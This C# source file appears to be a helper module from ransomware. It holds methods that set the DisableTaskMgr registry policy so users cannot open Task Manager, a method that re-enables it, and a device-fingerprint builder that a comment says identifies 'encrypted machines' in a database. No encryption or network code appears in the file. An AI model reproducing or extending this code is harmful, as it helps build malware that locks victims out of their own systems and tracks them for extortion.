using DeviceId;
using Microsoft.Win32;

namespace takecare
{
    public class MachineMananger
    {
        // Pretty obvious that this will disable the taskmanager if possible.
        public static void DisableTaskManager()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") == null)
            {
                objRegistryKey.SetValue("DisableTaskMgr", "1");
            }
            objRegistryKey.Close();
        }

        // This will re-enable the taskmanager again
        public static void EnableTaskManager()
        {
            RegistryKey objRegistryKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
            if (objRegistryKey.GetValue("DisableTaskMgr") != null)
            {
                objRegistryKey.DeleteValue("DisableTaskMgr");
            }
            objRegistryKey.Close();
        }

        public static string GetDeviceInfo()
        {
            try
            {
                // Generate Device ID for Database to identify encrypted machines
                return new DeviceIdBuilder()
                    .AddMachineName()
                    .AddMacAddress()
                    .AddOsVersion()
                    .AddUserName()
                    .ToString();
            }
            catch
            {
                throw;
            }
        }
    }
}
